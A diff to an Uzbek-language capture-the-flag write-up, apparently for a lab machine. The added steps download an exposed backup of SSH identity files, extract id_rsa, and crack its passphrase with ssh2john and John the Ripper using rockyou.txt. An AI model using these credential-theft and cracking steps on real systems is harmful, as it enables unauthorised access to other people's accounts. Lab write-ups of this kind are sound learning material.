@@ -44,4 +44,42 @@ cat nhttpd.conf
 ```   
 ![image](https://github.com/user-attachments/assets/35f759a8-b731-4bb0-97df-899e0f2bed94)   
 
+```
+cd /home/david/public_www
+ls
+```
 
+```
+cd protected-file-area
+ls
+download backup-ssh-identify-files.tgz
+```
+
+![image](https://github.com/user-attachments/assets/0e9e53aa-190c-4d33-87bd-b8a4108db0da)   
+
+Arxivni ochib, SSH kalit ni topamiz va unga ruxsat beramiz:  
+```
+tar xzvf backup-ssh-identify-files.tgz
+cd home/david/.ssh
+ls
+chmod 600 id_rsa
+```
+
+SSH kalit bilan tizimga ulanishga harakat qilamiz:   
+```
+ssh -i id_rsa david@10.129.1.193
+```
+![image](https://github.com/user-attachments/assets/46748755-fd7f-4948-88fb-c66bedcc3c86)  
+
+Parol so‘raydi, shuning uchun ssh2john yordamida kalitni xeshga o‘giramiz va JohnTheRipper bilan xeshni buzamiz:  
+
+```
+locate ssh2john
+/usr/share/john/ssh2john.py id_rsa > sshhash
+```  
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt sshash
+```  
+
+![image](https://github.com/user-attachments/assets/b80e1f45-7ac7-4ddb-a21e-afbaca7653de)   
